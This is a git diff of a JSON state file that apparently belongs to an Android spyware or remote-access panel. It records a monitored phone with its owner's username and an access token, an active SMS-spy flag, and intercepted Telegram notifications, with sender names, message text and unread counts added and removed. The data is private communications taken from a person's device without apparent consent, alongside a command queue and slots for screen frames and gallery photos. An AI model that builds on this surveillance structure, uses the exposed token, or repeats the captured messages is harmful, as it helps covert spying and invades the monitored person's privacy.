@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777067828163,
+    "lastSeen": 1777067837184,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: BOT KONTOL",
+        "content": "✅ Berhasil kirim panel ke ID 7778294598",
+        "time": "25/04 04:57",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777067838240
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ ubilll・14968 pesan baru dari 126 obrolan",
+        "time": "25/04 04:57",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777067838044
+      },
       {
         "appName": "Telegram",
         "sender": "Fastcal haikk",
@@ -4003,22 +4019,6 @@
         "time": "25/04 03:15",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1777061707442
-      },
-      {
-        "appName": "Telegram",
-        "sender": "𝗚𝗕 𝗖𝗣𝗔𝗡𝗘𝗟 𝗔𝗟𝗟 𝗥𝗢𝗟𝗘 𝗕𝗬 DAFF: AsistenCpanel",
-        "content": "⏳ [AUTO-CHECK CPU] - V1\n\nMemulai pengecekan. Mohon tunggu...",
-        "time": "25/04 03:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777061707386
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Davii・5689 pesan baru dari 51 obrolan",
-        "time": "25/04 03:15",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1777061707294
       }
     ],
     "galleryPhotos": [],
